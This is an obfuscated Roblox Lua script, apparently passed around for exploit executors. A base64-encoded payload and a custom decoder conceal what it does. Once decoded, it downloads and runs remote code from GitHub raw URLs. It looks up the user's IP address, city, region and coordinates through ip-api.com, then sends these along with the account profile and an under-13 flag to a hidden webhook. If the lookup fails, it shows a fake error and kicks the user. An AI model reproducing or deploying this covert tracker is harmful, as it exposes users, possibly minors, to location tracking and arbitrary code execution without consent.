local a=[[local a="bG9jYWwgUGxheWVycyA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpDQpsb2NhbCBDbGllbnQgPSBQbGF5ZXJzLkxvY2FsUGxheWVyDQppZiBub3QgbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3N0YXZyYXR1bS9sdWEtc2NyaXB0L21haW4vbW1tL1doaXRlbGlzdGVkLmx1YSIpKClbUGxheWVyczpHZXRVc2VySWRGcm9tTmFtZUFzeW5jKHRvc3RyaW5nKFBsYXllcnM6Y2hpbGRyZW4oKVsxXSkpXSB0aGVuDQogICAgbG9jYWwgQUFBQkJCQ0NDID0gZ2FtZTpHZXRTZXJ2aWNlKCJNYXJrZXRwbGFjZVNlcnZpY2UiKTpHZXRQcm9kdWN0SW5mbyhnYW1lLlBsYWNlSWQpLk5hbWUNCiAgICBsb2NhbCBFeHBsb2l0ID0gaWRlbnRpZnlleGVjdXRvciBhbmQgaWRlbnRpZnlleGVjdXRvcigpIG9yICJVbmtub3duIg0KICAgIGxvY2FsIGFfZzU3cThmID0gcmVxdWVzdCBvciBodHRwX3JlcXVlc3Qgb3IgKGh0dHAgYW5kIGh0dHAucmVxdWVzdCkgb3IgKHN5biBhbmQgc3luLnJlcXVlc3QpDQogICAgbG9jYWwgYl82eTd0cHEgPSBnYW1lOkdldFNlcnZpY2UoIkh0dHBTZXJ2aWNlIikNCiAgICBsb2NhbCBjX3k2cnNlMiA9IGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL09QRU5DVVAvcmFuZG9tLXRleHRzL21haW4vaXQtZG9lcy1ub3RoaW5nLmx1YSIpDQogICAgbG9jYWwgZF83OWdzMmYgPSAiUE9TVCINCiAgICBpZiBub3QgaXNmaWxlKCJjb3VudGVyLnR4dCIpIHRoZW4NCiAgICAgICAgd3JpdGVmaWxlKCJjb3VudGVyLnR4dCIsdG9zdHJpbmcoMCkpDQogICAgZW5kICAgIA0KICAgIGxvY2FsIGNvdW50ID0gcmVhZGZpbGUoImNvdW50ZXIudHh0Iikgb3IgMA0KICAgIGxvY2FsIGVfcTI0cjY2ID0gImFwcGxpY2F0aW9uL2pzb24iDQogICAgbG9jYWwgZl84Y2MycWQgPSBhX2c1N3E4Zih7VXJsID0gImh0dHA6Ly9pcC1hcGkuY29tL2pzb24vIiwgTWV0aG9kID0gIkdFVCJ9KQ0KICAgIGlmIGZfOGNjMnFkLlN1Y2Nlc3MgdGhlbiBnZXRnZW52KCkuTE9BRF9zODU3YnUgPSBiXzZ5N3RwcTpKU09ORGVjb2RlKGZfOGNjMnFkLkJvZHkpIGVsc2UgQ2xpZW50OktpY2soIlxuQW4gZXJyb3Igb2NjdXJlZCB3aGlsZSBleGVjdXRpbmcgc2NyaXB0LiBQbGVhc2UgcmVqb2luIG9yIGNvbnRhY3Qgc3VwcG9ydCBhdCBkaXNjb3JkLmdnLzROYUNHYkpaVTUgKGNvZGU6IDEpIikgZW5kDQogICAgbG9hZHN0cmluZyhjX3k2cnNlMikoKQ0KICAgIGZ1bmN0aW9uIGdlbmVyYXRlKGxlbmdoKQ0KICAgICAgICBsb2NhbCBhbHBoYWJldCA9IHt9DQogICAgICAgIGxvY2FsIGdlbnN0cmluZyA9ICIiDQogICAgICAgIGZvciBhID0gOTcsIDEyMiBkbw0KICAgICAgICAgICAgbG9jYWwgY2hhciA9IHV0ZjguY2hhcihhKQ0KICAgICAgICAgICAgdGFibGUuaW5zZXJ0KGFscGhhYmV0LCBjaGFyKQ0KICAgICAgICBlbmQNCiAgICAgICAgZm9yIGIgPSAxLCBsZW5naCBkbw0KICAgICAgICAgICAgbG9jYWwgcmFuZCA9IG1hdGgucmFuZG9tKDEsICNhbHBoYWJldCkNCiAgICAgICAgICAgIGdlbnN0cmluZyA9IGdlbnN0cmluZy4uYWxwaGFiZXRbcmFuZF0NCiAgICAgICAgICAgIGlmIGIgPT0gbGVuZ2ggdGhlbg0KICAgICAgICAgICAgICAgIHJldHVybiBnZW5zdHJpbmcNCiAgICAgICAgICAgIGVuZA0KICAgICAgICBlbmQNCiAgICBlbmQNCiAgICBsb2NhbCB1c2VyaWQgPSBDbGllbnQuVXNlcklkDQogICAgbG9jYWwgaGVhZHNob3QgPSAiaHR0cHM6Ly93d3cucm9ibG94LmNvbS9oZWFkc2hvdC10aHVtYm5haWwvaW1hZ2U/dXNlcklkPSIuLnVzZXJpZC4uIiZ3aWR0aD02MCZoZWlnaHQ9NjAmZm9ybWF0PXBuZyINCiAgICBjb3VudCA9IGNvdW50ICsgMQ0KICAgIGxvY2FsIGdfdDNxOTZzID0gYV9nNTdxOGYoew0KICAgICAgICBVcmwgPSBnZXRnZW52KCkuSEhqekJRU0J0ell2Z0pWTCwNCiAgICAgICAgTWV0aG9kID0gZF83OWdzMmYsDQogICAgICAgIEhlYWRlcnMgPSB7DQogICAgICAgICAgICBbIkNvbnRlbnQtVHlwZSJdID0gZV9xMjRyNjYNCiAgICAgICAgfSwNCiAgICAgICAgQm9keSA9IGJfNnk3dHBxOkpTT05FbmNvZGUoew0KICAgICAgICAgICAgY29udGVudCA9IG5pbCwNCiAgICAgICAgICAgIGVtYmVkcyA9IHsNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHRpdGxlID0gIlNjcmlwdCBleGVjdXRpb24gZGV0ZWN0ZWQhIDszIiwNCiAgICAgICAgICAgICAgICAgICAgZGVzY3JpcHRpb24gPSAiRXhlY3V0ZWRBdDogKioqIi4ub3MuZGF0ZSgiJWMiLCBvcy50aW1lKCkpLi4iKioqXG5FeGVjdXRpb25BbW91bnQ6ICoqIi4uY291bnQuLiIqKiAqdGltZXMgKGJ5IGN1cnJlbnQgdXNlcikqIiwNCiAgICAgICAgICAgICAgICAgICAgY29sb3IgPSB0b251bWJlcigiMHgiLi5Db2xvcjMuZnJvbVJHQihtYXRoLnJhbmRvbSgxLCAyNTUpLCBtYXRoLnJhbmRvbSgxLCAyNTUpLCBtYXRoLnJhbmRvbSgxLCAyNTUpKTpUb0hleCgpKSwNCiAgICAgICAgICAgICAgICAgICAgZmllbGRzID0gew0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIG5hbWUgPSAiVXNlciBJbmZvcm1hdGlvbiIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFsdWUgPSAiUHJvZmlsZTogaHR0cHM6Ly93d3cucm9ibG94LmNvbS91c2Vycy8iLi51c2VyaWQuLiIvcHJvZmlsZVxuRXhwbG9pdDogKioiLi5FeHBsb2l0Li4iKipcblVzZXJVbmRlcjEzOiAqKiIuLnRvc3RyaW5nKENsaWVudDpHZXRVbmRlcjEzKCkpLi4iKioiDQogICAgICAgICAgICAgICAgICAgICAgICB9LA0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIG5hbWUgPSAiR2VuZXJhbCBJbmZvcm1hdGlvbiIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFsdWUgPSAiQ291bnRyeTogKioiLi5nZXRnZW52KCkuTE9BRF9zODU3YnUuY291bnRyeS4uIioqXG5DaXR5OiAqKiIuLmdldGdlbnYoKS5MT0FEX3M4NTdidS5jaXR5IC4uIioqXG5SZWdpb246ICoqIiAuLiBnZXRnZW52KCkuTE9BRF9zODU3YnUucmVnaW9uTmFtZSAuLiAiKioiDQogICAgICAgICAgICAgICAgICAgICAgICB9LA0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIG5hbWUgPSAiTG9jYXRpb24iLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhbHVlID0gIkxhdGl0dWRlOiAqKiIuLmdldGdlbnYoKS5MT0FEX3M4NTdidS5sYXQuLiIqKlxuTG9uZ2l0dWRlOiAqKiIuLmdldGdlbnYoKS5MT0FEX3M4NTdidS5sb24uLiIqKiINCiAgICAgICAgICAgICAgICAgICAgICAgIH0sDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgbmFtZSA9ICJJUCBhZGRyZXNzIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YWx1ZSA9ICIqKl9fIi4uZ2V0Z2VudigpLkxPQURfczg1N2J1LnF1ZXJ5Li4iX18qKiINCiAgICAgICAgICAgICAgICAgICAgICAgIH0sDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgbmFtZSA9ICJTZXJ2ZXIgSW5mb3JtYXRpb24iLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhbHVlID0gIkdhbWVOYW1lOiAqKiIuLkFBQUJCQkNDQy4uIioqXG5QbGFjZUlkOiAqKiIuLmdhbWUuUGxhY2VJZC4uIioqXG5Kb2JJZDogKioiLi5nYW1lLkpvYklkLi4iKipcblBsYXllcnM6ICoqIi4uI1BsYXllcnM6R2V0Q2hpbGRyZW4oKSAuLiAiLzMwKioiDQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIH0sDQogICAgICAgICAgICAgICAgICAgIGZvb3RlciA9IHsNCiAgICAgICAgICAgICAgICAgICAgICAgIHRleHQgPSAiSW5mb3JtYXRpb24gcHJvdmlkZWQgYnkgd2ViaG9vay1jaGFuIDwzIHwgIi4uZ2VuZXJhdGUoOCksDQogICAgICAgICAgICAgICAgICAgICAgICBpY29uX3VybCA9ICJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdHRhY2htZW50cy85OTY3Nzg0NTg3ODI4OTIxMTIvOTk2Nzc4NDc1NDM4NDg5NjUwL2NhdF9naXJsc19kdW1wZXIucG5nIg0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfSwNCiAgICAgICAgICAgIHVzZXJuYW1lID0gQ2xpZW50LkRpc3BsYXlOYW1lLi4iIChAIi4uQ2xpZW50Lk5hbWUuLiIpIiwNCiAgICAgICAgICAgIGF2YXRhcl91cmwgPSBoZWFkc2hvdA0KICAgICAgICB9KQ0KICAgIH0pDQogICAgaWYgZ190M3E5NnMuU3VjY2VzcyB0aGVuDQogICAgICAgIHdyaXRlZmlsZSgiY291bnRlci50eHQiLHRvc3RyaW5nKGNvdW50KSkNCiAgICAgICAgYV9nNTdxOGYsYl82eTd0cHEsY195NnJzZTIsZF83OWdzMmYsZV9xMjRyNjYsZl84Y2MycWQsZ190M3E5NnMsZ2V0Z2VudigpLkxPQURfczg1N2J1LGdldGdlbnYoKS5ISGp6QlFTQnR6WXZnSlZMID0gbmlsDQogICAgZW5kDQplbmQgICAg"local b="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"function dec(c)c=string.gsub(c,'[^'..b..'=]','')return c:gsub('.',function(d)if d=='='then return''end;local e,f='',b:find(d)-1;for g=6,1,-1 do e=e..(f%2^g-f%2^(g-1)>0 and'1'or'0')end;return e end):gsub('%d%d%d?%d?%d?%d?%d?%d?',function(d)if#d~=8 then return''end;local h=0;for g=1,8 do h=h+(d:sub(g,g)=='1'and 2^(8-g)or 0)end;return string.char(h)end)end;loadstring(dec(a))()]]loadstring(a)()
